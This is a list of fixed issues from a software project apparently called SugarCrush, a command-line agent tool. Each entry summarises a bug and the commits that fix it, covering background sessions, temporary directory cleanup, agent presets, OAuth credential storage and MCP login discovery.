- **BG-1** Nothing could stop a background session, because the daemon's `STOP` command had no sender — fixed on master in `0214944fc` (new `/bg stop <id>`: `BackgroundSupervisor::stopSession()` tries the authenticated `STOP`, then SIGTERM, then a tree kill, sending each signal only after re-checking the pid's `/proc` start time; the daemon traps SIGTERM; a stopped session settles as `Stopped`; `docs/COMMANDS.md` documents the command).
- **BG-2** Per-launch IPC directories under `/tmp` were never removed — fixed on master in `2c12e9c9a` + `f7a6ac85b` (a settled session releases its `.sock`, `.buffer`, `.buffer.log` and `.token`, and the private directory when the last one settles, only inside the supervisor's own directory; `BackgroundSupervisor::sweepStaleIpcDirs()`, run from `ToolIpcFiles::sweepOnce()` at boot, removes stale IPC directories: older than 86400 s, with the exact minted name, owned by the user, holding only files and sockets). Behaviour change: a settled session's `.buffer.log` (the daemon's stderr) is deleted too, so a failed `/bg` task no longer leaves that log behind. Residual: the `/bg` tests in `tests/ChatTest.php` never tick, so each full run still leaves about two `sugar_crush_bg_*` directories in `/tmp` (the startup sweep removes them later).
- **AG-2** One preset file in the Claude Code `tools:` spelling disabled every agent preset in every tier — fixed on master in `7c74ea7d7` (`AgentPresetRegistry::list()` parses each file on its own; a bad file is skipped and recorded in the new `skippedFiles()`; `tools`, `disallowedTools`, `skills` and `mcpServers` accept comma strings; a scalar string field that is not a string is refused naming the file and field; `Bootstrap::agentPresets()` shows one launch notice per skip, `AGENT_PRESET_SKIP_NOTICE_FORMAT`).
- **TMP-1** Fixed, shared `/tmp` directory names let the first user disable Task resume for everyone — fixed on master in `b468ef96e` (`sugarcrush-suspended-delegations-<euid>` and `sc-hook-ctx-<euid>`, with a `-noposix` form when ext-posix is missing, following `AuditHook::directoryFor()`; `verifiedDirectory()`'s checks are unchanged; `docs/HOOKS.md` names the new path).
- **AG-3** `AgentManager` never forgot a sub-agent — fixed on master in `54a3f4d52` (at most 64 finished sub-agents are kept, `RETAINED_TERMINAL_SUB_AGENTS`, oldest dropped through the formerly uncalled `removeSubAgent()`; pending and running agents are never dropped; pruning runs on creation and in `executeAll()`'s `finally`, so a batch larger than 64 still returns every result; dropped agents' tokens, cost and elapsed time are folded into per-agent totals).
- **MCP-7** The OAuth store wrote back a stale per-process cache and was not atomic — fixed on master in `1f3df682e` (every write takes an exclusive lock on a `<file>.lock` sidecar, re-reads the file, merges one row and publishes through `AtomicJsonFile` at 0600; `deleteAuth()` takes the same path; the cache follows the disk; a write over a corrupt file refuses instead of dropping every credential).
- **MCP-8** An expired login with no refresh token stored the client id as a never-expiring bearer — fixed on master in `0b748df43` + `909703a7d` + `164d6cf9a` (such an entry throws a "re-run `sugarcrush mcp auth login`" error, or names `/mcp add` for client-credentials entries, sends no request and leaves the store unchanged; `updateRegistration()` is off the token path and RFC 7592-correct, using `registration_client_uri` with the full body, kept on the new `AuthEntry::registrationClientUri` (legacy rows still load); a missing `expires_in` is accepted as an unknown expiry). Residual: `HttpMcpServer` has no refresh-on-401, so an unknown-expiry token is sent until the user logs in again; a client-credentials entry with no refresh token needs a manual re-add when it expires.
- **MCP-6** `mcp auth login` could not log in to a path-bearing MCP URL — fixed on master in `0687c8dc8` (new `OAuthDiscovery`: RFC 9728 protected-resource metadata first, then the RFC 8414 path-inserted and origin-only forms, at most 6 fetches, deduplicated; shared by login and `/mcp add`; `fetchOAuthMetadata()` throws on non-2xx; login takes a fourth `[registration-url]` operand; explicit `/mcp add` endpoints beat discovered ones; the stored key stays the exact URL the user gave). Residual: the `WWW-Authenticate` `resource_metadata` hint is not read, and only `authorization_servers[0]` is tried. Still open nearby: the registration body's `client_metadata` envelope (MCP-10).
- **DOC-2** `docs/MCP.md` still said an unknown server `type` made startup ordering-dependent — fixed on master in `ec0640ee8` + `1360cbd01` (the sentence is gone, the bold **throws** that `DocFigureProseDriftTest` pins is kept, the page says `startTimeout` is stdio-only and that `claude-mcp` uses the fixed 60 s `DEFAULT_START_TIMEOUT_SECONDS`; `McpStartupOrderingDocDriftTest` now scans MCP.md too).
